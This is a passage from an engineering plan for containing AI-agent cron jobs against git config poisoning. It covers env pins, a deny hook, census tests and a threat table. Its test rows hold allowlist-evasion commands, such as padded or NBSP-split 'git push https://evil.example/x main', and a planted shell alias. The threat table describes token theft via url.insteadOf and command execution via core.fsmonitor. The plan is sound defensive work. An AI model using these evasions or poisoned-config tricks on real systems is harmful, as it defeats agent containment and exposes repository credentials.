...CRON_GIT_CONFIG_PIN }`. Each of the `spawnGit` helpers in `cron-compound-promote.ts:715`,
`cron-content-publisher.ts:105`, `cron-rule-prune.ts:71` and `cron-weekly-analytics.ts:45` becomes
`spawn("git", args, { stdio: "ignore", ...opts, env: { ...process.env, ...CRON_GIT_CONFIG_PIN } })`. In the same
edit, remove `env?` from the opts type of the content-publisher, rule-prune and weekly-analytics helpers. No caller
passes one, and with the field removed a future caller gets a compile error instead of a silently dropped env. The two
`cron-github-cidr-refresh.ts` calls (`:123`, `:204`) pass `env: { ...process.env, ...CRON_GIT_CONFIG_PIN }` at the call
site (beside the existing `cwd` at `:204`), so `runProc` itself and its `bash` caller (`:185`, already a Class B
literal) do not change. The `env` is
built at call time, never as a module-load snapshot (ADR-323 Decision 9, the `cron-content-vendor-drift-env.test.ts`
precedent).

2.4b The four `spawnScriptCapture` bash helpers (`cron-weekly-analytics.ts`, `cron-content-vendor-drift.ts`,
`cron-content-publisher.ts`, `cron-rule-prune.ts`) pass `env: opts.env`. Change each to
`env: withCronGitConfigPin(opts.env)` (CTO H5). This is not a bare last spread, because a bare spread would replace a
caller's stricter `/dev/null` global with the identity file and break F-A. Their callers already pass a pinned
Class B literal, so behaviour does not change.

2.5 `cron-content-vendor-drift.ts` `spawnGit`/`spawnGitStdout`: remove `env?` from both opts types and drop
`...opts?.env`, so `env` is `gitIsolatedEnv()` alone. The `/dev/null` keys then win by construction (CTO F-A note).
No caller passes an env (seven call sites checked), so behaviour does not change.

2.6b New-rule deny telemetry (CTO H3). The deny reason never leaves the host: `countPermissionDenials`
(`server/cron-filing-deny-marker.ts`) keeps only the tool class. So:
- Export one pure `classifyNewRuleDeny(toolName, toolInput)` from `cron-bash-allowlist-hook.mjs`. It returns a
  closed rule id (`git-gh-shape`, `protected-gitconfig`, `protected-xdg-git`, `protected-trust-root`) or `null`.
  The hook's own deny paths for the new rules call the same function, so the metric cannot drift from the gate.
- Add `countNewRuleDenials(denials)` beside `countPermissionDenials` in `cron-filing-deny-marker.ts`, which already
  imports from the `.mjs`. It reads Bash `tool_input.command` and Write/Edit `tool_input.file_path`.
- Call it in the substrate's `parseClaudeResultLine`. Emit `warnSilentFallback` with op
  `cron-containment-new-rule-deny`, tags `cron` and `rule` only, and the count in `extra`. Never include the command
  or the path, because they can carry tokens. Emit at most one event per run per rule.
- It sees only denials that reach `permission_denials[]`. That is the measured behaviour recorded in the marker
  header.

2.6 Import style: `import { CRON_GIT_CONFIG_PIN } from "@/server/host-git";` in each edited inngest file. Never retype
the path `/usr/local/share/soleur/agent.gitconfig`. The census asserts that the literal path appears nowhere under
`server/inngest/**`.

### Phase 3: Census tests (Guard 3)

3.1 Create `test/server/inngest/cron-spawn-git-config-pin.test.ts` (static, plus two real-git rows). Build the
census on the TypeScript compiler API (`ts.createSourceFile` over each file; precedent
`test/git-data-key-sweep.test.ts`; CTO G6), walking only non-test `*.ts` files under `server/inngest/**`
(recursive `readdirSync`, open-world). The `.mjs` hooks are out of the sweep. The test header says: every cron env
literal must end with `...CRON_GIT_CONFIG_PIN`, copy the env of an existing cron rather than writing one fresh, and
on a red census read the failure message, which names the file and the fix.

- **Row 0, the constant.** `expect(CRON_GIT_CONFIG_PIN).toStrictEqual({ GIT_CONFIG_GLOBAL: AGENT_GIT_GLOBAL_CONFIG,
  GIT_CONFIG_NOSYSTEM: "1" })`. That one assertion also rejects an extra `GIT_CONFIG_COUNT` key.
- **Row 2, the `HOME:` literal census.** For every object literal with a `HOME` property (keyed or shorthand), assert
  that its last element is a spread of `CRON_GIT_CONFIG_PIN`. Failure message: `<file:line> HOME: literal does not end
  with ...CRON_GIT_CONFIG_PIN. Add import { CRON_GIT_CONFIG_PIN } from "@/server/host-git" and make it the LAST
  entry.` The population is then compared with a stored identity map
  `KNOWN_HOME_LITERALS: { [file]: string[] }` that lists each site's enclosing function or step name (23 files, 26
  sites today). It stores identity, not a count (learning `2026-08-04-a-count-framed-ratchet-cannot-see-a-rename.md`),
  so a rename that keeps the count still goes red. Any difference fails with the diff: `new/removed HOME:
  literal(s): <file: +fnA -fnB>. Pin check: OK/FAILED. If you added a cron, update KNOWN_HOME_LITERALS.` This is a set
  diff, never a `>=` floor.
- **Walk self-test.** Each AST predicate has a positive control on synthetic source strings in the same file:
  - the `HOME` literal and its last element
  - the `"git"` first-argument call
  - row 4c's literal sweep

  The controls prove that the walk finds a planted instance, that `"git"` inside a `//` comment is not a hit, and that
  `"git"` inside a template literal with substitutions is reported (learning
  `2026-09-23-my-guards-read-source-through-a-stripper-that-deleted-the-code.md`).
- **Row 4, the git-spawn census.** For every call expression whose first argument is the string literal `"git"`
  (any callee: `spawn`, `execFileP`, `runProc`, `spawnSimple`), find the enclosing named function, or for an
  anonymous `step.run("<name>", …)` callback the step name. Assert one of:
  - the call's options object has an `env` property whose literal's last spread is `CRON_GIT_CONFIG_PIN`,
    `gitIsolatedEnv()` or `GIT_HARDENING_ENV`, and that `env` comes after any `...opts` spread;
  - a `GIT_CONFIG_GLOBAL = "/dev/null"` assignment to the env passed in the same function (`spawnGitCapture`);
  - the callee is `spawnSimple` (the chokepoint, proven by row 3).

  One named exception: `_cron-safe-commit.ts` `runGit`/`gitObjectBytes` spread `...extraEnv` after
  `GIT_HARDENING_ENV`. Their callers pass `exactModeEnv`, so the row also asserts that `exactModeEnv` has no
  `GIT_CONFIG_*` key. Compare the population with a stored map `KNOWN_GIT_SPAWNS: { [file]: [function or step] }`,
  which holds 15 pairs over 16 call sites today:
  - strategy-review: the clone
  - compound-promote: `spawnGit` and `spawnGitCapture`
  - content-publisher, rule-prune and weekly-analytics: `spawnGit`
  - vendor-drift: `spawnGit` and `spawnGitStdout`
  - substrate: the clone and the set-url
  - event-ship-merge: `checkout-pr` (two calls)
  - `_cron-safe-commit`: `runGit` and `gitObjectBytes`
  - cidr-refresh: `setupEphemeralWorkspace` and `refreshCidr`

  Failures print the diff and the fix.
- **Row 4c, no hidden git-capable spawn (CTO R3, G5, H5).** Every string literal, including any template literal,
  whose basename or leading word is `git`, `gh`, `bash`, `sh` or `env` must be the first argument of a call that
  carries an explicit `env`. The widened match catches `"/usr/bin/git"`, `execSync("git clone …")` and
  `spawn("sh", ["-c", "git …"])`. For `git`, that call must also pass row 4. For the other words, the `env` must be
  one of:
  - a literal ending with the pin
  - `withCronGitConfigPin(…)`
  - an identifier or call that resolves, by one hop in the same file, to a function or const whose value is a row-2
    `HOME` literal (follow-through-monitor's `ghEnv` and `buildSpawnEnv(...)`) Any other occurrence must be in the named list `GIT_CAPABLE_LITERAL_EXCLUSIONS:
  { file, line-anchor, reason }[]`, and each entry must have a non-empty `reason`. Seed that list by running the sweep
  once in Phase 0 and classifying every hit. Each hit is either an exclusion with a reason, or a site that gets the
  pin. Failure message: `bare "<word>" literal at <file:line> is not the first arg of a pinned spawn. Route it
  through spawnSimple or a helper that spreads CRON_GIT_CONFIG_PIN, or add {file, reason} to
  GIT_CAPABLE_LITERAL_EXCLUSIONS.` The node self-test probes (`_cron-claude-eval-substrate.ts`
  `execFileSync(nodeBin, …)`) run node, not git, and are listed by name as excluded from the invariant. Each exclusion
  must match exactly one live hit, keyed on a content anchor rather than a line number. A stale entry fails.
- **Binding, not name (CTO H5).** In rows 2, 4 and 4c, every accepting identifier must resolve through the
  TypeScript compiler API to a real definition: `CRON_GIT_CONFIG_PIN`, `withCronGitConfigPin`, `gitIsolatedEnv`,
  `GIT_HARDENING_ENV` and `spawnSimple` must resolve to an import from `@/server/host-git` or the substrate, or to one
  named same-file declaration (one hop). An unresolved identifier is a violation, never a pass. A synthetic-source
  control row must FAIL each of three planted cases: a local `const CRON_GIT_CONFIG_PIN = {}`, a local
  `function spawnSimple`, and a `"/usr/bin/git"` literal with no env.
- **Row 4d, no post-construction writes (CTO H5).** The sweep rejects, anywhere under `server/inngest/**`, an
  assignment, `delete` or computed-key write to a `GIT_CONFIG_*` property. The only exceptions are `spawnGitCapture`
  and the substrate chokepoints, held in a per-file exception map that must match exactly. Without this row, an
  `env.GIT_CONFIG_GLOBAL = …` written after the literal would escape every other row.
- **Row 4b, no retyped path.** No non-test file under `server/inngest/` contains `/usr/local/share/soleur/agent.gitconfig`.
- **Row 5, real git, the property end to end.** Make a temp dir H and write `H/.gitconfig` with `[user] name =
  planted` and `[alias] probe = !touch <H>/fired`. A shell alias needs no exec bit, so a noexec `/tmp` is fine.
  Build the env explicitly from `gitCleanEnv()` plus `fixtureCeiling` (from `plugins/soleur/test/lib/`), never from
  `process.env` and never from `gitFixtureEnv`, which pins `GIT_CONFIG_GLOBAL=/dev/null` and sets `XDG_CONFIG_HOME`
  and would make both arms identical. Both arms use `cwd: H`, `GIT_CEILING_DIRECTORIES` set to H's parent,
  `LC_ALL=C`, `GIT_CONFIG_NOSYSTEM=1` and `HOME: H`, so they differ only in `GIT_CONFIG_GLOBAL`. Plant the same keys in
  `H/.config/git/config` as well (P2 claims both global files). Assert with `git config --global --show-origin --get
  user.name`, so a failure names the level that answered. A third arm sets `GIT_CONFIG_SYSTEM=H/sys.gitconfig` (holding
  a planted alias) together with the pin, and asserts that the alias is absent. That proves `NOSYSTEM`
  behaviourally. Assert `git --version` >= 2.32 first, with its own message, so an old git does not read as a code
  bug.
  - With `{ PATH, HOME: H, ...CRON_GIT_CONFIG_PIN }`: `git config --get user.name` does not print `planted`, `git probe`
    exits non-zero with "not a git command", and `H/fired` does not exist.
  - With `{ PATH, HOME: H }` (the control): `user.name` is `planted` and `git probe` creates `H/fired`.
  - If `AGENT_GIT_GLOBAL_CONFIG` is absent on the test host, git treats it as an empty global, and this row still
    holds.
- **Row 5b, the XDG residual (CTO G3), characterisation only.** In real git with the pin set, write
  `H/.config/git/ignore` holding `secret.txt`. Assert that `git status --porcelain --ignored` still reports
  `secret.txt` as ignored. This records that the pin does not cover the XDG `ignore` and `attributes` defaults. The
  failure message reads "residual closed by git; update ADR-033", so a change in git shows up as news, not as a
  regression. The hook's deny on that path is the Guard 1 row `/home/soleur/.config/git/ignore` in 3.3, so it is not
  repeated here.
- **Row 6, the probes (CTO G2, H1, H4).** Through `vi.importActual("@/server/host-git")`, on temp paths only, never
  the real constant path:
  - `agentGitConfigReadable(tmpFile)` is true, and on a missing path it is false
  - `xdgGitResidualPresent(tmpHome)` is false, true once `tmpHome/.config/git/ignore` is a file, and false when
    `.config/git` is only a directory
  - `withCronGitConfigPin` forces the pin on a pin-less env and on an env with `/tmp/evil`, and keeps a caller's
    `GIT_CONFIG_GLOBAL: "/dev/null"`
- **Shared test setup (CTO H1).** `test/setup-node.ts`, which runs for both the `unit` and `repo-wide` vitest
  projects, registers a partial mock:
  `vi.mock("@/server/host-git", async (orig) => ({ ...(await orig()), agentGitConfigReadable: () => true, xdgGitResidualPresent: () => false }))`.
  Existing suites therefore keep reporting nothing on a healthy host, and their `reportSilentFallback` assertions
  (`cron-daily-triage.test.ts` `not.toHaveBeenCalled()` / `toHaveBeenCalledTimes(1)`) stay unchanged. Off-image the
  identity file is missing, so without this mock those assertions would go red.

3.2 Extend `test/server/inngest/cron-claude-eval-substrate-exit.test.ts`. It already mocks `node:child_process`.

- Rows 1 and 3 pick the spawn call by its command (`claude` or `git`), never by `spawnMock.mock.calls[0]`.
- **Row 1, the `spawnClaudeEval` chokepoint.** `buildSpawnEnv` returns `GIT_CONFIG_GLOBAL: "/tmp/evil"` and
  `GIT_CONFIG_NOSYSTEM: "0"`, and the spawned `opts.env` has both pin values. That proves both presence and priority.
- **Row 3, the `spawnSimple` chokepoint.** Two cases: no `env` (inherited `process.env` plus the pin), and an env
  with `GIT_CONFIG_GLOBAL: "/tmp/evil"`. Both spawn with the pin.
- **Row 6 wiring.** Override the shared mock so `agentGitConfigReadable` returns false. One `spawnClaudeEval` and one
  `spawnSimple` then lead to exactly one `reportSilentFallback` call with op `cron-git-config-pin`; filter by op, not
  by total count. Neither spawn is blocked. Flipping the override back to true and then to false again produces a
  second report, which proves the latch re-arms. The same applies to `xdgGitResidualPresent` with op
  `cron-git-xdg-config-present`.
- **Row 7, new-rule deny telemetry (CTO H3).** In the `cron-filing-deny-marker` test (or the substrate result-parse
  test), feed `countNewRuleDenials` synthetic `permission_denials[]` entries:
  - a padded `git ' push'` command → `git-gh-shape`
  - a Write to `~/.gitconfig` → `protected-gitconfig`
  - a Write to `~/.config/git/ignore` → `protected-xdg-git`
  - a Write to the trust root → `protected-trust-root`
  - a plain `git status` → none

  Assert one `warnSilentFallback` per rule, tagged `cron` and `rule` only, with no command or path in the payload. A
  parity row checks that `classifyNewRuleDeny` returns non-null exactly when `decide()` denies with a new-rule
  reason, across the 3.3 battery.

3.3 Extend `test/server/inngest/cron-bash-allowlist-hook.test.ts` (Guards 1 and 2):

- `describe("Write/Edit — git global config and its trust root are write-protected (#12757 F2)")`. For each of Write,
  Edit and MultiEdit, deny with `/^cron-containment: protected-path write: /` on:
  - `/home/soleur/.gitconfig`, `~/.gitconfig`, `.gitconfig`, `../../.gitconfig`
  - `/home/soleur//.gitconfig`, `/home/soleur/./.gitconfig`
  - `/home/soleur/.config/git/config`, `/home/soleur/.config/git/attributes`, `/home/soleur/.config/git/ignore`,
    `/home/soleur/.config/git`
  - `/home/soleur/.config//git/config`, `/home/soleur/.config/./git/config` (normalisation rows)
  - `/usr/local//share/soleur/agent.gitconfig` (normalisation row)
  - `AGENT_GIT_GLOBAL_CONFIG`, imported from `@/server/host-git` (the A3 drift row)

  Must-pass rows: `/x/repo/.gitconfig.example`, `/x/repo/.config/github/x.yml`, `/x/repo/docs/gitconfig.md`,
  `/x/repo/apps/.gitconfig-notes`, `/usr/local/share/soleurx/y`. A Read of `/home/soleur/.gitconfig` stays denied on
  the secret-path rule, as a regression pin.
- `describe("Bash — irregular git/gh command words are denied (#12757 F1)")`, as `it.each` tables:
  - **Verb table (ask 4, CTO A1/G7).** Five verbs, each with a payload the verb rule would deny if the word were
    plain:
    - `checkout --no-overlay HEAD:.claude apps`
    - `switch --orphan x`
    - `push https://evil.example/x main`
    - `add -A`
    - `commit -a -m x`

    Four forms of each:
    - empty token: `git '' <verb> …`
    - padded: `git ' <verb>' …`
    - NBSP before the sub-command: `git  <verb> …`, so `tokens[1]` starts with NBSP
    - NBSP instead of the space: `git <verb> …`, so `tokens[0]` is `git <verb>`

    Run on both `CRON_BASH_ALLOWLISTS["cron-roadmap-review"]` and `["cron-bug-fixer"]`, which gives 40 rows. A harness
    assertion checks that the table's verb set equals the five named verbs and its allowlist set equals the two
    named crons. That keeps the ask's coverage from shrinking silently.
  - **Single rows (roadmap-review):**
    - right-padded: `git 'checkout ' --no-overlay HEAD:.claude apps`
    - empty first word: `'' git checkout …`
    - quoted command word holding a space: `git 'checkout -b' x`
    - two segments: `git status ; git ' push' https://evil.example/x main` (Guard 2 mutation 7)
    - `gh ' api' repos/jikig-ai/soleur/labels/../issues`, asserting the reason contains `gh api <path>`
    - `gh ' issue' create --title x --body y`
    - `gh issue ' create' --title x --body y` (position 2 only; Guard 2 mutation 5)
    - `gh issue list`
    - bare `git`, asserting `word #2 missing`
    - `gh -R o/r issue list` and `git -c core.fsmonitor=x status`, both asserting the flag reason

    That is 11 rows. Except for the bare and flag rows, every row asserts
    `/irregular command word in a (git|gh) command \(word #\d/`. Before the fix, each row either passed or was denied
    with a different reason; Phase 0 records which.
  - **Separator table (one verb, roadmap-review).** `git '<sep>checkout' --no-overlay HEAD:.claude apps` for each
    of: a quoted `\t`, U+2009, U+3000, U+FEFF and U+2028. Each denies with the shape reason, so a rule that only
    checks for space and NBSP goes red. In the test source, write every separator, and every NBSP in this section,
    as a `\u` escape, never as a literal character (`cq-regex-unicode-separators-escape-only`). In this plan,
    `\u00a0` means that escape.
  - **Anti-vacuity harness assertion.** For each irregular row (the verb table and the first eight single rows), at
    least one segment of `splitSegments(cmd)` has `tokenize(seg).slice(0, 3)` different from
    `normalizeSegmentWhitespace(tokenize(seg).join(" ")).split(" ").slice(0, 3)`. The check is per segment, after
    the hook's own trim, so a row the hook would see as plain cannot pass as irregular.
- **Allowlist census.** For every distinct `git …`/`gh …` line in every `CRON_BASH_ALLOWLISTS` entry (22 distinct
  lines today, stored as `KNOWN_ALLOWLIST_GIT_GH_LINES`), the plain-spaced command `<line> x` is never denied by the
  shape rule. The row asserts exact equality between the derived set of distinct lines and the stored list, so a
  new line shows up as a diff. It is not a `>=` floor. Failure message: `allowlist line "<line>" in <cron> cannot be expressed under the
  command-word rule (positions git 0-1 / gh 0-2). Extend commandWordShapeReason and its ADR-033 note; don't loosen
  COMMAND_WORD_RE.`
- **Raw-rule regression rows (P5).** `git push --repo "origin evil"`, `git push --repo="origin evil"` and
  `git push "origin x"` stay denied on both allowlists, with their existing reasons.
- **Must-pass rows (roadmap-review):**
  - `git checkout -b feat/x-1`
  - `git switch main`
  - `git push origin feat/x`
  - `git push -u origin feat/x`
  - `git add apps/web-platform/x.ts`
  - `git commit -m "fix: a b c"`
  - `git commit -m "use -a flag"`
  - `gh issue list --label "a b"`
  - an honest multi-word `--body` filing taken from the existing class-3 rows, with an unchanged verdict
- Existing K1' rows (`K1_DENY`/`K1_ALLOW`) and every other existing row stay green unchanged.

### Phase 4: ADR-033 amendment (CTO F-F)

Add a dated `[Amended 2026-11-16 — #12757]` entry to
`knowledge-base/engineering/architecture/decisions/ADR-033-inngest-cron-functions-invoke-claude-code-via-child-process-spawn.md`
in two places:

- I7(a): Write/Edit self-protection also covers `.gitconfig`, `.config/git` and `/usr/local/share/soleur`, on the raw
  and the `posix.normalize`d path.
- A new sub-invariant (scoped per CTO G5): every cron child process that can run git (`git`, `gh`, `bash`,
  `claude`) carries `CRON_GIT_CONFIG_PIN` (`host-git.ts`), or a stricter
  `/dev/null` pin, applied at the `spawnClaudeEval` and `spawnSimple` chokepoints and in each env literal and git
  helper, and enforced by `cron-spawn-git-config-pin.test.ts`. Also record the command-word shape rule for git and gh
  (the raw command words at the allowlist's fixed positions must be plain), the trust-root directory
  `/usr/local/share/soleur` being write-protected (A3), and the residual that a flag-led git/gh allowlist line would
  need the rule extended. Residuals, stated plainly:
  - The node self-test probes (`execFileSync(nodeBin, …)` in the substrate) are excluded, because they run node.
  - The pin does not cover `$HOME/.config/git/ignore` or `attributes`, whose defaults come from XDG. Guard 1 is the
    barrier for them (CTO G3), and an `XDG_CONFIG_HOME` pin is deferred until the Dockerfile is in scope.
  - The founder-workspace git spawns outside `server/inngest/` (`git-config-atomic.ts`, `push-branch.ts`) inherit
    the container HOME and are not covered (CTO G4, follow-up under #9601).
  - The new-cron checklist item is "copy an existing cron's env; `cron-spawn-git-config-pin.test.ts` enforces it".

  Run `soleur:architecture` for the ADR edit. Add the G1 cross-reference line to ADR-287 in the same commit.

### Phase 5: Verification

- `cd apps/web-platform && ./node_modules/.bin/vitest run test/server/inngest/cron-bash-allowlist-hook.test.ts test/server/inngest/cron-spawn-git-config-pin.test.ts test/server/inngest/cron-claude-eval-substrate-exit.test.ts test/server/inngest/cron-gh-output-framing-hook.test.ts test/server/inngest/cron-claude-eval-substrate.test.ts`
- The suites of every edited cron file (`test/server/inngest/cron-*.test.ts`, `event-ship-merge.test.ts`,
  `oneshot-*.test.ts`), plus `test/host-git.test.ts`, `test/agent-env.test.ts` and
  `test/dockerfile-git-version-floor.test.ts`.
- `cd apps/web-platform && ./node_modules/.bin/tsc --noEmit`.
- The `discoverability_test` command below prints `protected-path write`.
- `bash plugins/soleur/test/c4-count-parity.test.sh` stays green (no C4 edit).

### Phase 6: Separate review round (asked)

Run `soleur:review` as its own round before merge, separate from the Phase 0-5 work commits. The
`single-user incident` threshold adds `soleur:engineering:review:user-impact-reviewer` (review skill, conditional
block). Ask for `soleur:engineering:review:security-sentinel` explicitly.

## Files to Edit

All paths are relative to the repo root.

- `apps/web-platform/server/inngest/cron-bash-allowlist-hook.mjs`: Phase 1.
- `apps/web-platform/server/host-git.ts`: add `CRON_GIT_CONFIG_PIN` and `agentGitConfigReadable` (2.1).
- `apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts`: the two chokepoints and the identity
  probe report (2.2).
- The Class A literals (2.3): `apps/web-platform/server/inngest/functions/cron-agent-native-audit.ts`,
  `cron-architecture-diagram-sync.ts`, `cron-bug-fixer.ts`, `cron-campaign-calendar.ts`, `cron-community-monitor.ts`,
  `cron-competitive-analysis.ts`, `cron-content-generator.ts`, `cron-daily-triage.ts`, `cron-follow-through-monitor.ts`,
  `cron-growth-audit.ts`, `cron-growth-execution.ts`, `cron-legal-audit.ts`, `cron-roadmap-review.ts`,
  `cron-seo-aeo-audit.ts`, `cron-ux-audit.ts`, `oneshot-f2-defer-gate-review.ts`, `oneshot-recheck-4217-calibration.ts`
  (all in `apps/web-platform/server/inngest/functions/`).
- The Class B literals, plus Class C where the same file has both (2.3, 2.4):
  `apps/web-platform/server/inngest/functions/cron-content-publisher.ts` (`:105`, `:158`),
  `cron-content-vendor-drift.ts` (`:495`, `:519`, `:1039`, `:1249`), `cron-github-cidr-refresh.ts` (`:123`, `:190`,
  `:204`),
  `cron-rule-prune.ts` (`:71`, `:205`), `cron-weekly-analytics.ts` (`:45`, `:137`), and `event-ship-merge.ts` (`:87`,
  `:180`, `:194`).
- Class C only (2.4): `apps/web-platform/server/inngest/functions/cron-strategy-review.ts` (`:127`) and
  `cron-compound-promote.ts` (`:715`).
- `apps/web-platform/test/server/inngest/cron-bash-allowlist-hook.test.ts`: 3.3.
- `apps/web-platform/test/server/inngest/cron-claude-eval-substrate-exit.test.ts`: 3.2.
- `apps/web-platform/test/server/inngest/cron-gh-output-framing-hook.test.ts`: the K2 comment only (1.3, CTO G1).
- `apps/web-platform/server/cron-filing-deny-marker.ts`: `countNewRuleDenials` (2.6b, CTO H3), plus its test file for
  row 7.
- `apps/web-platform/test/setup-node.ts`: the partial `@/server/host-git` mock (CTO H1).
- `knowledge-base/engineering/architecture/decisions/ADR-033-inngest-cron-functions-invoke-claude-code-via-child-process-spawn.md`:
  Phase 4.
- `knowledge-base/engineering/architecture/decisions/ADR-287-*.md`: one dated cross-reference line (CTO G1).
- Possibly `apps/web-platform/test/server/inngest/cron-bug-fixer.test.ts`: the `node:fs` mock, only if Phase 0 shows
  it is needed.

Count: hook 1, host-git 1, substrate 1, deny-marker 1, 23 `HOME:` files, 2 Class C-only files, 4 extended tests
(hook, substrate-exit, framing comment, deny-marker), 1 test setup, 2 ADRs. That is 36 edited files, or 37 with the
conditional mock fix. The four `spawnScriptCapture` files are already among the 23.

Not edited (OUT): `server/agent-env.ts`, `Dockerfile`, `server/inngest/functions/_git-hardening.ts`,
`_cron-safe-commit.ts`, any flag or prd setting, any `.c4` file.

## Files to Create

- `apps/web-platform/test/server/inngest/cron-spawn-git-config-pin.test.ts`: 3.1.

Glob verification: every path above was resolved with `git grep` / `ls` on 2026-11-16. The census sweep covers
non-test `*.ts` files under `apps/web-platform/server/inngest/` (the `.mjs` hooks are excluded, so their own `"git"`
literals never reach row 4c). `functions/*.ts` holds all 23 `HOME:` files, so the sweep is non-empty by
construction, and the stored maps back that up.

## Technical Considerations

- **Rollout:** this ships live on merge, with no flag (a flag change is OUT). It only tightens and fails closed.
  Commit identity is unchanged (P6). No Dockerfile change, no migration.
- **Over-deny cost:** only the command words are shape-checked, so arguments are untouched: `git commit -m "use -a
  flag"` and a quoted multi-word `--body` keep today's verdict. What is newly denied is a git/gh command whose command
  words are irregular, which no cron prompt prescribes. The deny reason says how to reword (CTO A1).
- **Performance:** one extra `join`/`replace`/`split` and at most three regex tests per git/gh segment. No I/O. The size
  bound (`MAX_BASH_COMMAND_CHARS`) runs first. Negligible.
- **Framing hook coupling:** no change to any function it imports (1.3). Its suite is in the Phase 5 run.
- **Dev hosts:** `AGENT_GIT_GLOBAL_CONFIG` exists only in the image. Off-image, git treats a missing global file as
  empty, which already holds for `hostGitInvocation` and the agent session. The Inngest functions are also registered
  by `npm run dev` on a developer host, where a cron commit would then lack an identity. The chokepoint probe (2.2)
  reports that to Sentry once per process instead of failing silently.
- **NFR:** security, the containment boundary, and git supply-chain integrity. No availability or latency NFR moves.

### Attack Surface Enumeration

Every way a cron run can get git to read attacker-chosen config, and how this plan handles each:

| Path | Today | After |
|---|---|---|
| Agent `Write`/`Edit`/`MultiEdit` to `$HOME/.gitconfig` or `$HOME/.config/git/*` | allowed | denied (Guard 1) |
| Agent `Bash` writes to those files (`>`, `tee`, `cp`, `git config --global`) | `>` and substitution are metachar-denied; `git config` is denied by `gitVerbReason`; `cp`/`tee`/`mv` are not on the roadmap-review or bug-fixer allowlists | unchanged, and the pin (Guard 3) keeps git from reading a written `.gitconfig`/`.config/git/config` even if a future allowlist admits a write verb. The exception is the XDG `ignore`/`attributes` defaults, which git reads whatever the pin says; Guard 1 is their only barrier (CTO G3) |
| `NotebookEdit` | falls to the catch-all deny | unchanged |
| A symlink created elsewhere that points at `~/.gitconfig`, then a Write through it | needs `ln`, which no allowlist admits | unchanged. The path regex cannot see symlinks (the same limit as every existing `WRITE_PROTECTED_PATTERNS` entry), and the pin covers it |
| Agent-run git reads `$HOME`'s gitconfig | yes | no (`spawnClaudeEval` chokepoint and Class A literals) |
| Server-side clone / set-url / fetch / apply reads `$HOME`'s gitconfig | yes (Class C, `spawnSimple` default) | no (Class C helpers, `spawnSimple` chokepoint) |
| Bash scripts that run git (`vendor-drift-classify.sh`) | yes | no (Class B literals) |
| Repo-local `.git/config` | `.git/` is write-protected and read-denied; handler-side git uses `GIT_HARDENING_ARGS` | unchanged (OUT: `safe.bareRepository`/`GIT_CONFIG_COUNT`) |
| System gitconfig | no `git config --system` in the image | `GIT_CONFIG_NOSYSTEM=1` everywhere (defence in depth) |
| Padded, empty or NBSP command word skipping git rules | skips | denied by the command-word shape rule (Guard 2) |
| Same for `gh api` / filing shape | skips (inert only because of cobra) | denied by the same rule (Guard 2) |
| Agent `Write`/`Edit` to the identity file `/usr/local/share/soleur/agent.gitconfig` | blocked only by root ownership 0644 | also denied by the hook (Guard 1, CTO A3) |
| `git -c <k>=<v> <sub>` / `git -C <dir> <sub>` | `tokens[1]` is the flag. The allowlist prefix `git <sub>` does not match `git -c …`, so it is denied as not allowlisted | unchanged; recorded as a residual note in ADR-033 |

## User-Brand Impact

- **If this lands broken, the user experiences:** scheduled crons on the platform's own repo self-report FAILED, or
  deny a legitimate git/gh step, until a revert. The visible artifacts are missed daily triage and community digests,
  missing bot-fix PRs, and a missing roadmap-review filing. There is a quieter mode (CPO condition): an agent keeps
  rewording a denied commit message or filing, gives up, and the run reports success with no PR or digest. A commit
  under a wrong identity is ruled out, because the image asserts the identity file at build (`Dockerfile:165`).
- **If this leaks, the user's workflow and the plugin supply chain are exposed via:** a poisoned `~/.gitconfig` in
  the cron container. `url.insteadOf` would send a GitHub App installation token that can write to `jikig-ai/soleur`
  to an attacker host. `core.fsmonitor` or `help.autocorrect` would run attacker commands with the cron's env
  (`GH_TOKEN`, `ANTHROPIC_API_KEY`). The plugin is delivered from that repo to every install.
- **Permanent skip on over-deny (CTO H2):** a bug-fixer run whose step is over-denied ends in the fix-issue failure
  handler, which labels the issue `bot-fix/attempted`. That label is in `SKIP_LABELS` (`cron-bug-fixer.ts`), so the
  issue is never retried, even after a revert. Bug-fixer stays green with no PR. Detection is the H3 metric plus
  AC14(c), and recovery is the revert runbook's label-removal line.
- **Founder-workspace git (scope-out):** `server/git-config-atomic.ts` and `server/push-branch.ts` spawn git with no
  env in an authenticated user's workspace, and share the container HOME with crons. Before this PR, a cron agent could
  plant `~/.gitconfig` with the Write tool. After it, Guard 1 denies that write, so the path from cron to user is
  closed at the write. The read side stays unpinned: an agent session's read-write bind of `~/.gitconfig` is the
  remaining writer, and that is the G4 follow-up under #9601. It is not pinned here, because it is a different trust
  surface with no harness, under the one-PR cap (CTO G4).
- **Brand-survival threshold:** `single-user incident`.
- **Threshold decision (challengeable):** one successful exploit compromises the repository every plugin user pulls
  from, so the strictest tier applies. This matches the #9600 and host-side git hardening siblings in this epic. The
  CPO confirmed it at plan time ("approved with conditions"), and the conditions are folded in: the quiet failure mode
  is named above; the recovery hint is in the deny reason (1.2); post-merge verification is below; and the
  revert path is under Dependencies & Risks. `soleur:engineering:review:user-impact-reviewer` runs at review.

## Observability

```yaml
liveness_signal:
  what: "the existing per-cron Sentry cron heartbeat (postSentryHeartbeat in _cron-shared.ts) and the output-aware run verdict (resolveOutputAwareOk, _cron-shared.ts:1412); a hook deny surfaces in the run's permission_denials and a spawn-env fault surfaces as a thrown git error before the agent starts. No new signal is added."
  cadence: "per cron run, on each cron's own schedule"
  alert_target: "the existing Sentry issue routing and each cron's Sentry heartbeat monitor (ok:false); the cron's FAILED self-report issue"
  configured_in: "apps/web-platform/server/inngest/functions/_cron-shared.ts (heartbeat, resolveOutputAwareOk); apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts (clone error with redacted stderr)"
error_reporting:
  destination: "Sentry (layers 1-2 via reportSilentFallback and the Inngest sentry-correlation middleware) and Better Stack (layer 3, Vector journald shipper of the pino logs)"
  fail_loud: "a thrown 'git clone failed (exit N, signal S) for jikig-ai/soleur: <redacted stderr>' from setupEphemeralWorkspace, or a hook deny reason beginning 'cron-containment:' in the run's permission_denials"
failure_modes:
  - mode: "a legitimate git/gh step is over-denied by the command-word shape rule"
    detection: "in-surface: the hook's own deny reason, emitted from inside the cron agent's tool layer; the text names the rule (protected-path write / irregular command word in a git or gh command, with the plain form to use), which tells over-deny apart from a real block in one event"
    alert_route: "the run's FAILED self-report and Sentry heartbeat ok:false through resolveOutputAwareOk"
  - mode: "the pin breaks server-side git (identity file missing or unreadable)"
